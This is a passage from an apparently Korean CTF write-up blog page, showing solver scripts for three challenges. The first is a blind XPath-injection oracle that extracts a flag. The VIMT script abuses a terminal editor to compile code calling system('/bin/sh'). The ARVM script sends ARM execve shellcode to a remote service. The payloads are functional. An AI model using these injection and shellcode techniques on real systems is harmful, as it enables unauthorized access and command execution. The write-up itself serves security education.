+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/blog/login&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>:uid, <span style="color:#e6db74">&#34;pw&#34;</span>: upw})
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/blog/write&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;OKOKOK&#34;</span>, <span style="color:#e6db74">&#34;content&#34;</span>: <span style="color:#e6db74">&#34;OKOKOK&#34;</span>})
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">oracle</span>(cond):
+</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0&#39; or </span><span style="color:#e6db74">{</span>cond<span style="color:#e6db74">}</span><span style="color:#e6db74"> and &#39;1&#39;=&#39;1&#34;</span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/blog/read&#34;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;idx&#34;</span>: idx})
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;OKOKOK&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x100</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> oracle(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;string-length(system-property(&#39;flag&#39;))=</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>):
+</span></span><span style="display:flex;"><span>        flag_len <span style="color:#f92672">=</span> i
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(flag_len)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(flag_len):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> oracle(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;substring(system-property(&#39;flag&#39;), </span><span style="color:#e6db74">{</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, 1)=&#39;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>):
+</span></span><span style="display:flex;"><span>            flag <span style="color:#f92672">+=</span> c
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    print(flag)
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><hr>
+<h2 id="vimt">VIMT<a hidden class="anchor" aria-hidden="true" href="#vimt">#</a></h2>
+<p>문자를 입력하면 뒤에 랜덤한 문자열이 추가로 생긴다.
+바이너리를 분석해보면 <code>set y {n}</code>을 통해 n번째 줄로 이동할 수 있는 기능이 있다.
+ssh를 통해 접속하는 문제이므로 stty 명령을 통해 columns를 1로 설정하여 한 줄에 한 문자만 쓰이도록 할 수 있다.
+이를 이용해 문자를 입력하고, <code>set y {n}</code>으로 입력한 문자의 다음으로 이동하여 원하는 내용을 쓸 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;main() { system(&#34;/bin/sh&#34;); } //&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>rows <span style="color:#f92672">=</span> len(code)<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> ssh(user<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ctf&#34;</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;3.38.59.103&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">1234</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ctf1234_smiley&#34;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>process(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;$ &#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;stty rows </span><span style="color:#e6db74">{</span>rows<span style="color:#e6db74">}</span><span style="color:#e6db74"> cols 1&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;$ &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;./app&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rr</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(rows<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>readline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rr()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(code)):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(code[i])
+</span></span><span style="display:flex;"><span>    rr()
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;set y </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;compile&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<h2 id="arvm">ARVM<a hidden class="anchor" aria-hidden="true" href="#arvm">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( run_vm() <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>puts(<span style="color:#e6db74">&#34;Good! Now Execute Real Machine&#34;</span>);
+</span></span><span style="display:flex;"><span>dest <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1u</span>, <span style="color:#ae81ff">0x1000u</span>);
+</span></span><span style="display:flex;"><span>memcpy(dest, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(dword_2407C <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>), <span style="color:#ae81ff">0x1000u</span>);
+</span></span><span style="display:flex;"><span>memset(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(dword_2407C <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1000u</span>);
+</span></span><span style="display:flex;"><span>memcpy(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(dword_2407C <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>), <span style="color:#f92672">&amp;</span>unk_1346C, <span style="color:#ae81ff">0x34u</span>);
+</span></span><span style="display:flex;"><span>v3 <span style="color:#f92672">=</span> memcpy((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(dword_2407C <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">52</span>), dest, <span style="color:#ae81ff">0xFCCu</span>);
+</span></span><span style="display:flex;"><span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">**</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))(dword_2407C <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))(v3);
+</span></span></code></pre></div><p>vm을 작동하는 함수가 -1을 반환하지 않으면, 입력한 code를 실행해준다.
+code의 처음에 0x0이 있다면 그대로 <code>run_vm()</code>이 정상적으로 종료되는 것을 확인할 수 있었다.
+그 뒤에 shellcode를 추가하여 shell을 획득할 수 있었다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;arm&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;15.165.92.159&#34;</span>, <span style="color:#ae81ff">1234</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&gt; &#34;</span>, code)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view_code</span>():
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1. Run&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_code</span>():
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Secret code : &#34;</span>)
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;:&gt; &#34;</span>, code)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>run_code()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://blog.imssm99.com">imssm99 Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
